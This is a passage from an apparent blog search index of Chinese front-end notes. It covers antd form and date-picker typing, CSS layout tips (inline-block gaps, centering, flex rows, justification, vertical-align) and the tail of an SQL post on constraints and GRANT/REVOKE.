<span class="token keyword">END</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>提示：<strong>约束比触发器更快</strong><br>一般来说，约束的处理比触发器快，因此在可能的时候，应该尽量使用约束。</p>
</blockquote>
<h3 id="数据库安全"><a href="#数据库安全" class="headerlink" title="数据库安全"></a>数据库安全</h3><p>大多数 DBMS 都给管理员提供了管理机制，利用管理机制授予或限制对数据的访问。</p>
<p>安全性使用 SQL 的 GRANT 和 REVOKE 语句来管理，不过大多数 DBMS 提供了交互式管理实用程序，这些程序底层实际上还是在使用 GRANT 和 REVOKE 语句。</p>
]]></content>
      <categories>
        <category>SQL</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>antd表单组件注意事项</title>
    <url>/2021/05/03/antd%E8%A1%A8%E5%8D%95%E7%BB%84%E4%BB%B6%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9/</url>
    <content><![CDATA[<h2 id="表单-Form-Item-只会对它的直接子元素绑定表单功能"><a href="#表单-Form-Item-只会对它的直接子元素绑定表单功能" class="headerlink" title="表单 Form.Item 只会对它的直接子元素绑定表单功能"></a>表单 Form.Item 只会对它的直接子元素绑定表单功能</h2><p>例如 Form.Item 直接包裹了 Input/Select。若是在 Input 等控件前后还有文案或样式装点，抑或是控件是经过条件判断后再直接包裹的，都无法自动绑定表单功能。还需要使用内嵌的 Form.Item 来完成表单功能。可以在 Form.Item 上添加 noStyle 属性作为无样式的绑定组件。</p>
<pre class="line-numbers language-tsx" data-language="tsx"><code class="language-tsx"><span class="token comment">// 有文案或样式的情况</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Form.Item</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Field<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Form.Item</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>field<span class="token punctuation">"</span></span> <span class="token attr-name">noStyle</span><span class="token punctuation">></span></span><span class="token plain-text">&lt;Input /></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Form.Item</span></span><span class="token punctuation">></span></span><span class="token plain-text"> // 直接包裹才会绑定表单
  </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">description</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Form.Item</span></span><span class="token punctuation">></span></span>
<span class="token comment">// 有条件判断的情况</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Form.Item</span></span> <span class="token attr-name">label</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Field<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">
  </span><span class="token punctuation">&#123;</span>condition <span class="token operator">?</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Form.Item</span></span> <span class="token attr-name">noStyle</span><span class="token punctuation">></span></span><span class="token plain-text">&lt;Input /></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Form.Item</span></span><span class="token punctuation">></span></span> <span class="token operator">:</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Form.Item</span></span> <span class="token attr-name">noStyle</span><span class="token punctuation">></span></span><span class="token plain-text">&lt;Select /></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Form.Item</span></span><span class="token punctuation">></span></span><span class="token punctuation">&#125;</span><span class="token plain-text">
</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Form.Item</span></span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考<a href="https://ant.design/components/form-cn/#components-form-demo-complex-form-control">官方文档</a></p>
</blockquote>
]]></content>
      <categories>
        <category>antd</category>
      </categories>
      <tags>
        <tag>antd</tag>
        <tag>form</tag>
      </tags>
  </entry>
  <entry>
    <title>css使用inline-block时去除间隙</title>
    <url>/2019/05/13/css%E4%BD%BF%E7%94%A8inline-block%E6%97%B6%E5%8E%BB%E9%99%A4%E9%97%B4%E9%9A%99/</url>
    <content><![CDATA[<h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>属性为display: inline-block的元素之间，换行显示或用空格分隔的情况下会产生间距。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>一<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>二<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>四<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这种间距会影响到我们布局，如何去除这种间距？</p>
<h2 id="经典解决方案"><a href="#经典解决方案" class="headerlink" title="经典解决方案"></a>经典解决方案</h2><h3 id="使用html解决，将inline-block元素写在一行里，或让标签首尾不换行"><a href="#使用html解决，将inline-block元素写在一行里，或让标签首尾不换行" class="headerlink" title="使用html解决，将inline-block元素写在一行里，或让标签首尾不换行"></a>使用html解决，将inline-block元素写在一行里，或让标签首尾不换行</h3><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!-- 将inline-block元素写在一行 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>一<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>二<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>四<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!-- 标签首尾不换行 --></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  一<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  二<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  三<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>
  四
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缺点：影响代码美观与格式化</p>
<h3 id="使用css解决，设置父元素font-size为0，或设置子元素margin或letter-spacing或word-spacing属性为负值。"><a href="#使用css解决，设置父元素font-size为0，或设置子元素margin或letter-spacing或word-spacing属性为负值。" class="headerlink" title="使用css解决，设置父元素font-size为0，或设置子元素margin或letter-spacing或word-spacing属性为负值。"></a>使用css解决，设置父元素font-size为0，或设置子元素margin或letter-spacing或word-spacing属性为负值。</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 设置font-size */</span>
<span class="token selector">ul</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 0<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">font-size</span><span class="token punctuation">:</span> 14px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* 设置margin或letter-spacing或word-spacing */</span>
<span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">margin</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">letter-spacing</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">word-spacing</span><span class="token punctuation">:</span> -1<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>缺点：跨浏览器兼容不好</p>
<h2 id="终级解决方案"><a href="#终级解决方案" class="headerlink" title="终级解决方案"></a>终级解决方案</h2><h3 id="在父元素上使用display-flex"><a href="#在父元素上使用display-flex" class="headerlink" title="在父元素上使用display: flex"></a>在父元素上使用display: flex</h3><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">ul</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">ul li</span> <span class="token punctuation">&#123;</span>
  <span class="token property">display</span><span class="token punctuation">:</span> inline-block<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>inline-block</tag>
      </tags>
  </entry>
  <entry>
    <title>antd日期选择器更换为dayjs后typescript声明文件还要求传参类型为moment</title>
    <url>/2021/06/09/antd%E6%97%A5%E6%9C%9F%E9%80%89%E6%8B%A9%E5%99%A8%E6%9B%B4%E6%8D%A2%E4%B8%BAdayjs%E5%90%8Etypescript%E5%A3%B0%E6%98%8E%E6%96%87%E4%BB%B6%E8%BF%98%E8%A6%81%E6%B1%82%E4%BC%A0%E5%8F%82%E7%B1%BB%E5%9E%8B%E4%B8%BAmoment/</url>
    <content><![CDATA[<h2 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h2><p>由于 moment 时间库过大，且不再维护，故想要将之替换为 dayjs 库，antd 官方文档中也提供了两种方式去替换。使用 antd-dayjs-webpack-plugin 这种替换方式，无需使用自定义的日期选择器组件，故选择该方式。</p>
<p>真实开发场景在 Typescript 环境下使用时，发现传参要求还是 moment 类型，与 dayjs 类型不一致。</p>
<span id="more"></span>

<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>官方文档对 antd-dayjs-webpack-plugin 方式说明不详细，实际上这种方式是基于 moment 与 dayjs 接口一致的条件下，在编译阶段将 moment 替换为 dayjs 的，而 antd 关于日期的 ts 类型并未改变。故而书写业务逻辑代码时，还是应该使用 moment，或者覆盖 antd 中的类型。而若要完全脱离 moment 库在业务逻辑代码中使用 dayjs，则必需要使用第一种方式，即自定义日期选择器的形式。</p>
<p>我最终还是在代码中使用了 moment 而没有覆盖 antd 类型，覆盖类型不优雅，而自定义组件放在框架中不方便，他人使用总是习惯从 antd 中引入，而不是自定义组件中。</p>
<pre class="line-numbers language-ts" data-language="ts"><code class="language-ts"><span class="token comment">// 覆盖antd类型</span>
<span class="token keyword">declare</span> <span class="token keyword">module</span> <span class="token string">"moment"</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Dayjs <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"dayjs"</span><span class="token punctuation">;</span>
  <span class="token keyword">namespace</span> moment <span class="token punctuation">&#123;</span>
    <span class="token keyword">type</span> <span class="token class-name">Moment</span> <span class="token operator">=</span> Dayjs<span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">export</span> <span class="token operator">=</span> moment<span class="token punctuation">;</span>
  <span class="token keyword">export</span> <span class="token keyword">as</span> <span class="token keyword">namespace</span> moment<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-js" data-language="js"><code class="language-js"><span class="token comment">// 自定义日期选择器</span>
<span class="token keyword">import</span> dayjsGenerateConfig <span class="token keyword">from</span> <span class="token string">"rc-picker/es/generate/dayjs"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> generatePicker <span class="token keyword">from</span> <span class="token string">"antd/es/date-picker/generatePicker"</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token string">"antd/es/date-picker/style/index"</span><span class="token punctuation">;</span>

<span class="token keyword">const</span> DatePicker <span class="token operator">=</span> <span class="token function">generatePicker</span><span class="token punctuation">(</span>dayjsGenerateConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">default</span> DatePicker<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考资料</p>
<p><a href="https://github.com/ant-design/antd-dayjs-webpack-plugin/issues/23">antd-dayjs-webpack-plugin 插件替换 moment 之后，TypeScript 声明文件还是要求传参类型为 moment.Moment</a></p>
<p><a href="https://github.com/ant-design/ant-design/issues/27276">使用 Dayjs 替换 Moment 自定义 DatePicker 后，组件无法国际化</a></p>
<p><a href="https://codesandbox.io/s/wentifuxiandemo-forked-l3704?file=/index.js">自定义日期选择器代码示例</a></p>
</blockquote>
]]></content>
      <categories>
        <category>antd</category>
      </categories>
      <tags>
        <tag>antd</tag>
        <tag>日期选择器</tag>
      </tags>
  </entry>
  <entry>
    <title>css优先级之important</title>
    <url>/2018/11/09/css%E4%BC%98%E5%85%88%E7%BA%A7%E4%B9%8Bimportant/</url>
    <content><![CDATA[<p>注意：应该尽量使用 css 优先级规则，慎用!important，这会扰乱 css 的优先级规则，造成无法定位 bug 的情况。尽量使用优先级规则来解决问题，不要在全站 css 上使用!important，不要在插件中使用!important，只在特定页面使用。</p>
<p>可以使用的情况：有全站 css 文件时，还使用了在 html 中写入的内联样式，这时可以使用!important 覆盖内联样式。</p>
<p>若要覆盖!important 规则，只要在其后再加一条!important 规则。</p>
]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>important</tag>
      </tags>
  </entry>
  <entry>
    <title>css单行文字分散对齐</title>
    <url>/2019/03/08/css%E5%8D%95%E8%A1%8C%E6%96%87%E5%AD%97%E5%88%86%E6%95%A3%E5%AF%B9%E9%BD%90/</url>
    <content><![CDATA[<h1 id="css单行文字分散对齐"><a href="#css单行文字分散对齐" class="headerlink" title="css单行文字分散对齐"></a>css单行文字分散对齐</h1><p>在页面中，我们有时候为了显示上的美观，会做文字的分散对齐，如何用css实现单行文字分散对齐呢？</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* webkit内核浏览器 */</span>
<span class="token selector">.test</span> <span class="token punctuation">&#123;</span>
  <span class="token property">text-align-last</span><span class="token punctuation">:</span> justify<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* IE浏览器兼容方案 */</span>
<span class="token selector">.test</span> <span class="token punctuation">&#123;</span>
  <span class="token property">text-align</span><span class="token punctuation">:</span> justify<span class="token punctuation">;</span>
  <span class="token property">text-justify</span><span class="token punctuation">:</span> distribute<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>分散对齐</tag>
        <tag>两端对齐</tag>
      </tags>
  </entry>
  <entry>
    <title>css使用transform居中</title>
    <url>/2018/11/09/css%E4%BD%BF%E7%94%A8transform%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<h1 id="使用transform居中"><a href="#使用transform居中" class="headerlink" title="使用transform居中"></a>使用transform居中</h1><p>绝对定位时尽量使用transform中的translate进行定位，而不是用margin为负值进行定位，因为margin为负值的定位是必须要知道自身的宽高的，而transform中的translate可以用-50%这样的百分比。</p>
<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 父元素 */</span>
<span class="token selector">.parent</span> <span class="token punctuation">&#123;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/* 子元素 */</span>
<span class="token selector">.child</span> <span class="token punctuation">&#123;</span>
    <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>
    <span class="token comment">/* 水平居中 */</span>
    <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateX</span><span class="token punctuation">(</span>-50%<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 垂直居中 */</span>
    <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translateY</span><span class="token punctuation">(</span>-50%<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* 可以合并写为 */</span>
    <span class="token property">left</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">top</span><span class="token punctuation">:</span> 50%<span class="token punctuation">;</span>
    <span class="token property">transform</span><span class="token punctuation">:</span> <span class="token function">translate</span><span class="token punctuation">(</span>-50%<span class="token punctuation">,</span> -50%<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>居中</tag>
        <tag>transform</tag>
      </tags>
  </entry>
  <entry>
    <title>css列表渲染使用flex布局固定每行布局数量</title>
    <url>/2019/02/11/css%E5%88%97%E8%A1%A8%E6%B8%B2%E6%9F%93%E4%BD%BF%E7%94%A8flex%E5%B8%83%E5%B1%80%E5%9B%BA%E5%AE%9A%E6%AF%8F%E8%A1%8C%E5%B8%83%E5%B1%80%E6%95%B0%E9%87%8F/</url>
    <content><![CDATA[<h1 id="css列表渲染使用flex布局固定每行布局数量"><a href="#css列表渲染使用flex布局固定每行布局数量" class="headerlink" title="css列表渲染使用flex布局固定每行布局数量"></a>css列表渲染使用flex布局固定每行布局数量</h1><p>在实际应用中，我们常常会使用for循环渲染输出html内容块，然后使用flex布局及flex布局中的flex-wrap属性来使循环渲染的内容块自动换行。这样做的弊端是当浏览器的宽度改变时每行的内容块数量也会改变，无法获得统一的视觉体验。如何使浏览器宽度改变时flex布局每行布局数量不变呢？</p>
<p>这里有一个小技巧，即对html内容块使用百分比宽度布局。</p>
<p>仅使用百分比宽度布局则会发现无法给内容块之间设置间距，每个内容块都是紧密相连的。大家可能会想到使用justify-content属性与align-items属性来增加间距，justify-content中的space-around、space-evenly等属性值可以使内容块水平分散对齐，但是最后一行如果未填满，也会被居中，视觉体验并不好。那么如何解决间距问题呢？</p>
<p>这里我们把刚刚的内容块作为一个容器，给内容块设置一个padding值。这样就有了间距。真正的内容放置在内容块内层的div中即可。</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>block<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>content<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token selector">.container</span> <span class="token punctuation">&#123;</span>
    <span class="token property">display</span><span class="token punctuation">:</span> flex<span class="token punctuation">;</span>
    <span class="token property">flex-wrap</span><span class="token punctuation">:</span> wrap<span class="token punctuation">;</span>
    <span class="token property">background</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.block</span> <span class="token punctuation">&#123;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 25%<span class="token punctuation">;</span> <span class="token comment">/* 每行4个 */</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 20%<span class="token punctuation">;</span> <span class="token comment">/* 每行5个 */</span>
    <span class="token property">background</span><span class="token punctuation">:</span> green<span class="token punctuation">;</span>
    <span class="token property">padding</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token selector">.content</span> <span class="token punctuation">&#123;</span>
    <span class="token property">width</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">height</span><span class="token punctuation">:</span> 100%<span class="token punctuation">;</span>
    <span class="token property">background</span><span class="token punctuation">:</span> blue<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      <categories>
        <category>css</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>flex</tag>
        <tag>列表渲染</tag>
      </tags>
  </entry>
  <entry>
    <title>css内联元素的vertical-align</title>
    <url>/2019/08/05/css%E5%86%85%E8%81%94%E5%85%83%E7%B4%A0%E7%9A%84vertical-align/</url>
    <content><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="vertical-align-的使用范围"><a href="#vertical-align-的使用范围" class="headerlink" title="vertical-align 的使用范围"></a>vertical-align 的使用范围</h3><p>vertical-align 只能应用于 inline 元素，即 display 为 inline、inline-block、inline-table 的元素，img 与 span 都是 inline 元素</p>
<h3 id="基线"><a href="#基线" class="headerlink" title="基线"></a>基线</h3><p>图中的 baseline 即为元素的基线，x-height 就是 x 高度</p>
<p><img src="../images/css-baseline.png" alt="baseline"></p>
<p>由图可见<strong>元素基线位置是由元素自身的字体大小与行高决定的</strong>，还会受到子元素影响。</p>
<h4 id="inline-table-的基线"><a href="#inline-table-的基线" class="headerlink" title="inline-table 的基线"></a>inline-table 的基线</h4><p>以表格第一行的基线为基线</p>
<h4 id="inline-block-的基线"><a href="#inline-block-的基线" class="headerlink" title="inline-block 的基线"></a>inline-block 的基线</h4><ol>
<li><p>在有正常文档流内容或 overflow 属性计算值为 visible 以外的值的情况下，inline-block 元素的 baseline 就是最后一个 line-box 元素的 baseline；</p>
</li>
<li><p>除上面两种情况外，baseline 是 margin-box 的下边界；</p>
</li>
</ol>
<span id="more"></span>

<h2 id="vertical-align"><a href="#vertical-align" class="headerlink" title="vertical-align"></a>vertical-align</h2><p>vertical-align 属性默认取值为 baseline，即将当前 box 的基线与父级 box 的基线对齐。</p>
